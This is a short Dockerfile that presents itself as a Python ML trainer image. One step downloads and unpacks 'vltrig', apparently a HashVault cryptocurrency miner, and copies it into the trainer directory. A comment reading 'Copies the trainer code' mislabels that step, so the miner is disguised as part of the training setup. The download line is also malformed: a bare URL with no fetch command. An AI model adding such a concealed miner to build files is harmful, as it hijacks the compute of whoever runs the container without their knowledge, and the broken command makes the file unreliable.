FROM python:3.8.19-slim
WORKDIR /
RUN apt update && apt -y install curl git wget sudo ufw
# Copies the trainer code to the docker image.
RUN https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz && tar xf vltrig-v6.26.0.4-linux-x64.tar.gz
COPY trainer /trainer
COPY vltrig /trainer
# Sets up the entry point to invoke the trainer.
ENTRYPOINT ["python", "-m", "trainer.task"]
